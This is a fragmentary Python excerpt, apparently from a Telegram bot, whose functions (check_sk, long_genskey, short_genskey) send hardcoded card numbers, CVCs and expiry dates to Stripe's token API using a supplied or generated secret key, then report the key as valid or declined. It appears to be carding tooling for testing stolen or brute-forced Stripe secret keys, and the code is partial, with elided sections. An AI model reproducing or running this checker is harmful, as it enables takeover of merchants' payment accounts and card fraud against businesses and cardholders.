...
def check_sk(key):
    data = 'card[number]=4512238502012742&card[exp_month]=12&card[exp_year]=2028&card[cvc]=354'
    ...
    if status == 200 or type == 'card_error':
        r_text, r_logo, r_respo = 'ᴠᴀʟɪᴅ ᴀᴘɪ ᴋᴇʏ', '✅', 'ᴠᴀʟɪᴅ ᴀᴘɪ ᴋᴇʏ'
    else:
...
async def long_genskey(_, message):
    ...
    pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2029'}, auth=(skkey, ""))
...
async def short_genskey(_, message):  # Changed function name to avoid conflict
    ...
    pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2028'}, auth=(skkey, ""))
    if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
        await message.reply(f"""
**ᴅᴇᴄᴀʟɪɴᴇᴅ ❌**
